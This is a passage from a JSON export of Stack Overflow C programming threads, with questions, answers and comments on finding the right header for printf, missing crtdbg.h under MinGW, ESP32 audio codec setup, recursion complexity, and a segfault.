"https://i.stack.imgur.com/79CdE.jpg?s=128&g=1", "display_name": "c_student", "link": "https://stackoverflow.com/users/11120993/c-student"}, "is_accepted": false, "score": 7, "last_activity_date": 1551830182, "last_edit_date": 1551830182, "creation_date": 1551827393, "answer_id": 55013069, "question_id": 55012968, "link": "https://stackoverflow.com/questions/55012968/c-how-can-i-know-what-header-do-i-need-for-the-functions-i-am-using/55013069#55013069", "title": "C: How can I know what header do I need for the functions I am using?", "body": "<p>Considering that you might not be able to search online (which would be the obvious choice most of the time I guess) and that you are on a linux machine you could also search for it in the man pages.<br>\nTo search inside the man pages you can use <code>man -k {search term}</code>   </p>\n\n<p>For example <code>printf</code>  </p>\n\n<pre><code>$ man -k printf \nasprintf (3)         - print to allocated string\ndprintf (3)          - formatted output conversion\nfprintf (3)          - formatted output conversion\nfwprintf (3)         - formatted wide-character output conversion\nprintf (1)           - format and print data\nprintf (3)           - formatted output conversion\nsnprintf (3)         - formatted output conversion\nsprintf (3)          - formatted output conversion\nswprintf (3)         - formatted wide-character output conversion\nvasprintf (3)        - print to allocated string\nvdprintf (3)         - formatted output conversion\nvfprintf (3)         - formatted output conversion\nvfwprintf (3)        - formatted wide-character output conversion\nvprintf (3)          - formatted output conversion\nvsnprintf (3)        - formatted output conversion\nvsprintf (3)         - formatted output conversion\nvswprintf (3)        - formatted wide-character output conversion\nvwprintf (3)         - formatted wide-character output conversion\nwprintf (3)          - formatted wide-character output conversion\nXtAsprintf (3)       - memory management functions\n\n$ man 3 printf\nPRINTF(3)                                                                                  Linux Programmer's Manual                                                                                 PRINTF(3)\n\nNAME\n       printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf - formatted output conversion\n\nSYNOPSIS\n       #include &lt;stdio.h&gt;\n\n       int printf(const char *format, ...);\n       int fprintf(FILE *stream, const char *format, ...);\n...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "is_accepted": false, "score": 5, "last_activity_date": 1551828335, "creation_date": 1551828335, "answer_id": 55013199, "question_id": 55012968, "link": "https://stackoverflow.com/questions/55012968/c-how-can-i-know-what-header-do-i-need-for-the-functions-i-am-using/55013199#55013199", "title": "C: How can I know what header do I need for the functions I am using?", "body": "<p>As has been mentioned in comments, you can use the search feature on <a href=\"https://en.cppreference.com/w/c/header\" rel=\"noreferrer\">https://en.cppreference.com/w/c/header</a>.</p>\n\n<p>Just make sure you select the C version of the function.</p>\n\n<p><a href=\"https://i.stack.imgur.com/2Ag6E.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/2Ag6E.png\" alt=\"enter image description here\"></a></p>\n\n<p>And the header you need to include is listed at the top of the page.</p>\n\n<p><a href=\"https://i.stack.imgur.com/MZiT2.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/MZiT2.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 2963, "user_id": 1461017, "user_type": "registered", "accept_rate": 26, "profile_image": "https://i.stack.imgur.com/W3CrL.jpg?s=128&g=1", "display_name": "Sopalajo de Arrierez", "link": "https://stackoverflow.com/users/1461017/sopalajo-de-arrierez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 594, "favorite_count": 0, "answer_count": 3, "score": 3, "last_activity_date": 1551862757, "creation_date": 1551826804, "question_id": 55012968, "link": "https://stackoverflow.com/questions/55012968/c-how-can-i-know-what-header-do-i-need-for-the-functions-i-am-using", "title": "C: How can I know what header do I need for the functions I am using?", "body": "<p>Example <strong>program in C</strong> (without headers):</p>\n\n<pre><code>int main()\n{\nprintf(\"\\nHello World\\n\");\n}\n</code></pre>\n\n<p>How can I know <strong>what include header</strong> (example: <code>#include &lt;stdio.h&gt;</code>) should I prepend?</p>\n"}, {"tags": ["c", "visual-studio-code", "crtdbg.h"], "comments": [{"owner": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551827088, "post_id": 55012944, "comment_id": 96780681, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/12685202/how-do-i-get-crtdbg-h-file\">How do I get crtdbg.h file?</a>"}, {"owner": {"reputation": 35, "user_id": 11156662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b84fcbfccdda839b85479f1559439c2a?s=128&d=identicon&r=PG&f=1", "display_name": "Jackpot", "link": "https://stackoverflow.com/users/11156662/jackpot"}, "reply_to_user": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551827367, "post_id": 55012944, "comment_id": 96780768, "body": "it doesnt work that answer"}, {"owner": {"reputation": 35, "user_id": 11156662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b84fcbfccdda839b85479f1559439c2a?s=128&d=identicon&r=PG&f=1", "display_name": "Jackpot", "link": "https://stackoverflow.com/users/11156662/jackpot"}, "reply_to_user": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551827434, "post_id": 55012944, "comment_id": 96780781, "body": "<code>source.c:24:5: error: &#39;_CrtDumpMemoryLeaks&#39; was not declared in this scope      _CrtDumpMemoryLeaks();</code> thats what appear when used the post answer"}, {"owner": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551827822, "post_id": 55012944, "comment_id": 96780871, "body": "I got other way can you check if it work for you?"}, {"owner": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551828654, "post_id": 55012944, "comment_id": 96781078, "body": "<a href=\"https://stackoverflow.com/questions/7286935/mysql-c-api-compilation-error-crtdbg-h-not-found\" title=\"mysql c api compilation error crtdbg h not found\">stackoverflow.com/questions/7286935/&hellip;</a>"}, {"owner": {"reputation": 35, "user_id": 11156662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b84fcbfccdda839b85479f1559439c2a?s=128&d=identicon&r=PG&f=1", "display_name": "Jackpot", "link": "https://stackoverflow.com/users/11156662/jackpot"}, "reply_to_user": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551828951, "post_id": 55012944, "comment_id": 96781156, "body": "@AmadeuAntunes So i cant check memory leak with MinGW?"}, {"owner": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551830243, "post_id": 55012944, "comment_id": 96781528, "body": "<a href=\"https://www.cryengine.com/community_archive/viewtopic.php?f=314&amp;t=73533\" rel=\"nofollow noreferrer\">cryengine.com/community_archive/viewtopic.php?f=314&amp;t=73533</a>"}, {"owner": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 1, "creation_date": 1551830482, "post_id": 55012944, "comment_id": 96781581, "body": "I just upper vote I hope someone can know what to do with it, I was searching on google about it but not a solution yet"}], "answers": [{"tags": [], "owner": {"reputation": 36, "user_id": 11155628, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NnSV7shHVcg/AAAAAAAAAAI/AAAAAAAABKY/Gn5uKrQh0EY/photo.jpg?sz=128", "display_name": "HectorTav", "link": "https://stackoverflow.com/users/11155628/hectortav"}, "is_accepted": false, "score": 0, "last_activity_date": 1551827048, "creation_date": 1551827048, "answer_id": 55013014, "question_id": 55012944, "link": "https://stackoverflow.com/questions/55012944/vscode-crtdbg-h-not-found-how-to-fix/55013014#55013014", "title": "VsCode crtdbg.h not found, how to fix?", "body": "<p><a href=\"https://stackoverflow.com/questions/12685202/how-do-i-get-crtdbg-h-file\">This</a> should help...</p>\n\n<pre><code>#ifdef _MSC_VER\n#include &lt;crtdbg.h&gt;\n#else\n#define _ASSERT(expr) ((void)0)\n\n#define _ASSERTE(expr) ((void)0)\n#endif\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 7518824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85f7ce705029739ec2571e0cb3b35df6?s=128&d=identicon&r=PG&f=1", "display_name": "mm.persian", "link": "https://stackoverflow.com/users/7518824/mm-persian"}, "is_accepted": false, "score": 0, "last_activity_date": 1605624195, "creation_date": 1605624195, "answer_id": 64877439, "question_id": 55012944, "link": "https://stackoverflow.com/questions/55012944/vscode-crtdbg-h-not-found-how-to-fix/64877439#64877439", "title": "VsCode crtdbg.h not found, how to fix?", "body": "<p>I think that VSCODE couldn't access to header file, crtdbg.h , Pease test a simple following way. Maybe it solved your problem:</p>\n<p>1- Run as administrator Developer Command prompt for VS2019. I emphasized run as administrator no run.</p>\n<p>2- Type Code .</p>\n<p>3- Open project folder.</p>\n<p>4- Happy coding and enjoy it.</p>\n"}], "owner": {"reputation": 35, "user_id": 11156662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b84fcbfccdda839b85479f1559439c2a?s=128&d=identicon&r=PG&f=1", "display_name": "Jackpot", "link": "https://stackoverflow.com/users/11156662/jackpot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1989, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1605624195, "creation_date": 1551826665, "last_edit_date": 1552084903, "question_id": 55012944, "link": "https://stackoverflow.com/questions/55012944/vscode-crtdbg-h-not-found-how-to-fix", "title": "VsCode crtdbg.h not found, how to fix?", "body": "<p>Trying to check memory leak tool but Vscode doesn't recognize <code>#include &lt;crtdbg.h&gt;</code>. </p>\n\n<h2>Here is the code:</h2>\n\n<pre><code>#define _CRTDBG_MAP_ALLOC\n#include &lt;stdlib.h&gt;\n#include &lt;crtdbg.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char *word = \"this still relevant.\";\n    char *mem = (char *)malloc(sizeof(word));\n    strcpy(mem, word);\n    printf(\"%s\", mem);\n    system(\"pause\");\n    _CrtDumpMemoryLeaks();\n}\n</code></pre>\n\n<h2>The compile error:</h2>\n\n<pre><code>source.c:4:10: fatal error: crtdbg.h: No such file or directory\n#include &lt;crtdbg.h&gt;\n</code></pre>\n\n<blockquote>\n  <h2>How do I properly include crtdbg.h?</h2>\n</blockquote>\n\n<p>PS: I'm using MinGW compiler, everything works except that.</p>\n\n<p>EDIT 1: The solution of that other post doesn't work. If I use the suggested code this appear.</p>\n\n<pre><code>source.c:24:5: error: '_CrtDumpMemoryLeaks' was not declared in this scope\n     _CrtDumpMemoryLeaks();\n</code></pre>\n\n<p>EDIT 2: Does anyone uses VsCode with MinGW?</p>\n"}, {"tags": ["c", "audio", "embedded", "audio-recording", "esp32"], "comments": [{"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 1, "creation_date": 1551836979, "post_id": 55012774, "comment_id": 96783036, "body": "This seems a bit board for stack exchange - you are basically asking someone to point you at working code (or write it for you) rather than to help you find a <i>specific</i> problem in <i>specific</i> code.   You are more likely to get a useful result at the git issue where you already posted."}, {"owner": {"reputation": 24901, "user_id": 198927, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/eExki.jpg?s=128&g=1", "display_name": "Petrus Theron", "link": "https://stackoverflow.com/users/198927/petrus-theron"}, "reply_to_user": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1551887216, "post_id": 55012774, "comment_id": 96806727, "body": "@ChrisStratton, SE was founded exactly to unearth solutions that used to be hidden away in forums and issue trackers. I&#39;ve since answered my question, which linked to a specific C file that was unsupported by the manufacturer in the official repos and where the problem got few eyeballs. Of course, I would love to receive working code as answers to all my questions - wouldn&#39;t you? :)"}, {"owner": {"reputation": 24901, "user_id": 198927, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/eExki.jpg?s=128&g=1", "display_name": "Petrus Theron", "link": "https://stackoverflow.com/users/198927/petrus-theron"}, "reply_to_user": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1552291663, "post_id": 55012774, "comment_id": 96938194, "body": "@ChrisStratton I&#39;ve edited my question now that I know the nature of the problem."}, {"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1552299598, "post_id": 55012774, "comment_id": 96942271, "body": "Ironically, it looks like your original post had some of the missing information which you have now removed."}, {"owner": {"reputation": 24901, "user_id": 198927, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/eExki.jpg?s=128&g=1", "display_name": "Petrus Theron", "link": "https://stackoverflow.com/users/198927/petrus-theron"}, "reply_to_user": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1552300623, "post_id": 55012774, "comment_id": 96942844, "body": "@ChrisStratton if a code sample, specific hardware model code and error message is not enough detail for you, we&#39;ll have to agree to disagree. I moved the link to the known incompatibility to my answer because it puts the solution in context and having it in my question made it seem like I knew the solution when I posted, when I did not."}, {"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1552303025, "post_id": 55012774, "comment_id": 96944174, "body": "You&#39;ve turned the question from one asked by a <i>developer working the problem</i> with deductive evidence included to one by an end <i>user</i> throwing up their hands and hoping to be rescued.  That&#39;s off topic here."}], "answers": [{"comments": [{"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1552303196, "post_id": 55026181, "comment_id": 96944267, "body": "Good answer to an improper question"}], "tags": [], "owner": {"reputation": 24901, "user_id": 198927, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/eExki.jpg?s=128&g=1", "display_name": "Petrus Theron", "link": "https://stackoverflow.com/users/198927/petrus-theron"}, "is_accepted": true, "score": 2, "last_activity_date": 1552246769, "last_edit_date": 1552246769, "creation_date": 1551884617, "answer_id": 55026181, "question_id": 55012774, "link": "https://stackoverflow.com/questions/55012774/configuring-audio-codec-on-espressif-esp32-lyratd-msc-development-board/55026181#55026181", "title": "Configuring audio codec on Espressif ESP32-LYRATD-MSC Development Board", "body": "<p>This is a <a href=\"https://github.com/espressif/esp-adf/issues/18\" rel=\"nofollow noreferrer\">known issue</a> with the samples. The ESP32-LYRATD-MSC ships with the ZL38063 DSP chip, but as you can see from sample, it expects to configure the ESP8388:</p>\n\n<pre><code>audio_hal_codec_config_t audio_hal_codec_cfg =  AUDIO_HAL_ES8388_DEFAULT(); // offending line\naudio_hal_codec_cfg.i2s_iface.samples = AUDIO_HAL_16K_SAMPLES;\naudio_hal_handle_t hal = audio_hal_init(&amp;audio_hal_codec_cfg, 0);\naudio_hal_ctrl_codec(hal, AUDIO_HAL_CODEC_MODE_ENCODE, AUDIO_HAL_CTRL_START);\n</code></pre>\n\n<p>To resolve, configure for the ZL38063 instead:</p>\n\n<pre><code>audio_hal_handle_t init_audio_codec()\n{\n#if (CONFIG_ESP_LYRAT_V4_3_BOARD || CONFIG_ESP_LYRAT_V4_2_BOARD)\n    audio_hal_codec_config_t audio_hal_codec_cfg = AUDIO_HAL_ES8388_DEFAULT();\n    return audio_hal_init(&amp;audio_hal_codec_cfg, 0);\n#endif\n\n#if (CONFIG_ESP_LYRATD_MSC_V2_1_BOARD || CONFIG_ESP_LYRATD_MSC_V2_2_BOARD)\n    audio_hal_codec_config_t audio_hal_codec_cfg = AUDIO_HAL_ZL38063_DEFAULT();\n    return audio_hal_init(&amp;audio_hal_codec_cfg, 2);\n#endif\n}\n</code></pre>\n\n<h2>Then, in <code>app_main()</code>:</h2>\n\n<pre><code>audio_hal_ctrl_codec(init_audio_codec(), AUDIO_HAL_CODEC_MODE_BOTH, AUDIO_HAL_CTRL_START);\n</code></pre>\n"}], "owner": {"reputation": 24901, "user_id": 198927, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/eExki.jpg?s=128&g=1", "display_name": "Petrus Theron", "link": "https://stackoverflow.com/users/198927/petrus-theron"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 271, "favorite_count": 0, "accepted_answer_id": 55026181, "answer_count": 1, "score": 0, "last_activity_date": 1552246769, "creation_date": 1551825743, "last_edit_date": 1552246550, "question_id": 55012774, "link": "https://stackoverflow.com/questions/55012774/configuring-audio-codec-on-espressif-esp32-lyratd-msc-development-board", "title": "Configuring audio codec on Espressif ESP32-LYRATD-MSC Development Board", "body": "<p>When I compile and flash an ESP32-LYRATD-MSC with the <a href=\"https://github.com/espressif/esp-adf/blob/master/examples/recorder/pipeline_raw_http/main/record_raw_http.c\" rel=\"nofollow noreferrer\">official audio recording examples</a>, I get an <code>es_write_reg</code> error after configuring the ES8388 codec driver.</p>\n\n<p>What could have changed from the LYRA or WROVER kits to the LYRATD-MSC that could cause the error?</p>\n"}, {"tags": ["c", "recursion", "time-complexity", "big-o", "computer-science"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1551825522, "post_id": 55012724, "comment_id": 96780144, "body": "Multiply the complexity of each case by how many times it recurses."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551825559, "post_id": 55012724, "comment_id": 96780164, "body": "Just like an iterative process, where you multiply the complexity of the loop body by the number of times it repeats."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1551825596, "post_id": 55012724, "comment_id": 96780176, "body": "As far as Big-O is concerned, there&#39;s no difference between looping and recursing."}, {"owner": {"reputation": 13, "user_id": 11156649, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hyy8JrNKe2k/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfPy2TL2rKDY-gdr9wCYLZN9CzLBw/mo/photo.jpg?sz=128", "display_name": "Ramriddlz", "link": "https://stackoverflow.com/users/11156649/ramriddlz"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551825860, "post_id": 55012724, "comment_id": 96780271, "body": "This function prints out the list from the first element to the last, then the last to the first. So, the recursive case visits each element once. Then the last print statement is executed once in every iteration. So, in total the base case is O(1), the recursive case is O(length of the list) and the last print statement is O(1). Therefore, the running time of the function is O(Length of the list)."}, {"owner": {"reputation": 13, "user_id": 11156649, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hyy8JrNKe2k/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfPy2TL2rKDY-gdr9wCYLZN9CzLBw/mo/photo.jpg?sz=128", "display_name": "Ramriddlz", "link": "https://stackoverflow.com/users/11156649/ramriddlz"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551825886, "post_id": 55012724, "comment_id": 96780288, "body": "Would this be a valid explanation?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1551825945, "post_id": 55012724, "comment_id": 96780308, "body": "A better explanation is that each call is <code>O(1)</code>, and it recurses <code>n</code> times, so it&#39;s <code>O(n)</code>."}, {"owner": {"reputation": 13, "user_id": 11156649, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hyy8JrNKe2k/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfPy2TL2rKDY-gdr9wCYLZN9CzLBw/mo/photo.jpg?sz=128", "display_name": "Ramriddlz", "link": "https://stackoverflow.com/users/11156649/ramriddlz"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551829610, "post_id": 55012724, "comment_id": 96781334, "body": "Thank you so much!"}], "answers": [{"comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 1, "creation_date": 1551830321, "post_id": 55012851, "comment_id": 96781542, "body": "However, it is more interesting to say how n connects to the input instead of just saying &quot;Number of iterations&quot;. Otherwise, almost anything was O(n). So, in this case n is the length of the list."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551887323, "post_id": 55012851, "comment_id": 96806807, "body": "You don&#39;t multiply the complexity of the base case, since it only executes once. You multiply the complexity of the recursive cases, since they repeat."}], "tags": [], "owner": {"reputation": 36, "user_id": 11155628, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NnSV7shHVcg/AAAAAAAAAAI/AAAAAAAABKY/Gn5uKrQh0EY/photo.jpg?sz=128", "display_name": "HectorTav", "link": "https://stackoverflow.com/users/11155628/hectortav"}, "is_accepted": true, "score": 1, "last_activity_date": 1551826197, "creation_date": 1551826197, "answer_id": 55012851, "question_id": 55012724, "link": "https://stackoverflow.com/questions/55012724/i-am-a-little-confused-about-big-o-notation-with-recursive-functions/55012851#55012851", "title": "I am a little confused about Big-O Notation with recursive functions", "body": "<p>The time complexity would be O(n), where 'n' is how many times the recursive functions is called. It is basically calculated by multiplying the complexity of the base case by how many times it is called by the recursion. So the complexity is linear.  </p>\n"}], "owner": {"reputation": 13, "user_id": 11156649, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hyy8JrNKe2k/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfPy2TL2rKDY-gdr9wCYLZN9CzLBw/mo/photo.jpg?sz=128", "display_name": "Ramriddlz", "link": "https://stackoverflow.com/users/11156649/ramriddlz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "accepted_answer_id": 55012851, "answer_count": 1, "score": 1, "last_activity_date": 1551826197, "creation_date": 1551825407, "question_id": 55012724, "link": "https://stackoverflow.com/questions/55012724/i-am-a-little-confused-about-big-o-notation-with-recursive-functions", "title": "I am a little confused about Big-O Notation with recursive functions", "body": "<p>How can I find the running time of a recursive function. For example:</p>\n\n<pre><code>void fun_list(LLnode_t * head) {\n    if (head == NULL) {\n        printf(\"\\n\");\n        return;\n    }\n    printf(\"%d \", head-&gt; data);\n    if (head-&gt;next != NULL) {\n        fun_list(head-&gt;next);\n    }\n    printf(\"%d \", head-&gt;data);\n} \n</code></pre>\n\n<p>I know that we are supposed to find the running time of the recursive case and the base case. I think the running time of the base case is O(1). How would I go about finding the running time of the recursive case?</p>\n"}, {"tags": ["c", "algorithm", "pointers"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1551825441, "post_id": 55012685, "comment_id": 96780117, "body": "Can you at least use a debugger to identify <i>where</i> the segfault occurs?"}, {"owner": {"reputation": 11, "user_id": 11112262, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n5O5U.png?s=128&g=1", "display_name": "Amie Joni", "link": "https://stackoverflow.com/users/11112262/amie-joni"}, "reply_to_user": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1551825656, "post_id": 55012685, "comment_id": 96780198, "body": "i tried to do so using valgrind but cannot find the problem too"}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1551826375, "post_id": 55012685, "comment_id": 96780451, "body": "You&#39;re allocating the array as size nt x 1, and using more than one value in each row."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 11112262, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n5O5U.png?s=128&g=1", "display_name": "Amie Joni", "link": "https://stackoverflow.com/users/11112262/amie-joni"}, "edited": false, "score": 0, "creation_date": 1551826025, "post_id": 55012747, "comment_id": 96780333, "body": "Yes thank you this solve the problem and the code works well now , can you explain more because in my code i thought i have allocate  much memory"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 11, "user_id": 11112262, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n5O5U.png?s=128&g=1", "display_name": "Amie Joni", "link": "https://stackoverflow.com/users/11112262/amie-joni"}, "edited": false, "score": 0, "creation_date": 1551826340, "post_id": 55012747, "comment_id": 